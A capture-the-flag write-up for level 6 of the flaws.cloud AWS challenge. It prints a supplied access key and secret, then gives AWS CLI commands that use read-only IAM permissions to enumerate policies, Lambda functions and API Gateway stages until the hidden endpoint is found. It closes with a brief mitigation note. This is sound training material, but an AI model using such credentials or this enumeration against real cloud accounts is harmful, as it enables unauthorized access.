# Level 6
Received creds for this challenge
```
Access key ID: AKIAJFQ6E7BY57Q3OBGA  
Secret: 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
```
### Finding current user's details 
```bash
kali:level_6/ $ aws --profile level7_flaws iam get-user                                                                                 [1:40:13]
{
    "User": {
        "Path": "/",
        "UserName": "Level6",
        "UserId": "AIDAIRMDOSCWGLCDWOG6A",
        "Arn": "arn:aws:iam::975426262029:user/Level6",
        "CreateDate": "2017-02-26T23:11:16Z"
    }
}
```
### Looking at user's permissions, to check what this user has access to 
```bash
kali:level_6/ $ aws --profile level7_flaws iam list-attached-user-policies --user-name Level6      [1:42:18]
{
    "AttachedPolicies": [
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        },
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        }
    ]
}
```
- SecurityAudit policy gives permission to monitor accounts for compliance with security requirements. So, this account can access logs and events to investigate potential security breaches or potential malicious activity. 
- Has permission to view configuration data for many AWS services and review their logs.
- It also gives permissions to enumerate the lambda functions 
```bash
kali:flaws.cloud/ $ aws --region us-west-2 --profile level7_flaws lambda list-functions            [6:45:37]
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
            "Role": "arn:aws:iam::975426262029:role/service-role/Level6",
            "Handler": "lambda_function.lambda_handler",
            "CodeSize": 282,
            "Description": "A starter AWS Lambda function.",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2017-02-27T00:24:36.054+0000",
            "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
```
SecurityAudit permission also lets us run that function: 
```bash
kali:flaws.cloud/ $ aws --region us-west-2 --profile level7_flaws lambda get-policy --function-name Level6
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"
}
```
This verifies that we have the ability to execute the function **arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/\*/GET/level6**
"s33ppypa75" is the rest-api-id that be used with the resource we have access to due to "list_apigateway" policy.
- getting the version id of the policy (list_apigateways, because MySecurityAudit is a normal AWS policy, the other one is a custom policy made by the user)
```bash
kali:level_6/ $ aws --profile level7_flaws iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways 
{
    "Policy": {
        "PolicyName": "list_apigateways",
        "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",
        "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "Description": "List apigateways",
        "CreateDate": "2017-02-20T01:45:17Z",
        "UpdateDate": "2017-02-20T01:48:17Z",
        "Tags": []
    }
}
```
After getting the ARN and the policy ID it's possilbe to look at the actual policy
```bash
kali:level_6/ $ aws --profile level7_flaws iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Action": [
                        "apigateway:GET"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2017-02-20T01:48:17Z"
    }
}
```
According to this response, we can call "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/\*"
We can use the information obtained from enumerating the resources available with "SecurityAudit" policy
```bash
kali:flaws.cloud/ $ aws --profile level7_flaws --region us-west-2 apigateway get-stages --rest-api-id "s33ppypa75"
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
            "cacheClusterStatus": "NOT_AVAILABLE",
            "methodSettings": {},
            "tracingEnabled": false,
            "createdDate": 1488155168,
            "lastUpdatedDate": 1488155168
        }
    ]
}
```
Lambda functions are called using that rest-api-id, stage name, region and resource like 
https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6

### Note: 
- Read-only permissions such as SecurityAudit policy are quite commonly assigned to accounts 
- Enumerate all resources available to your own and other's IAM policies
#### Mitigation: 
Think carefully before assigning permissions to accounts, even if they are just to read the meta-data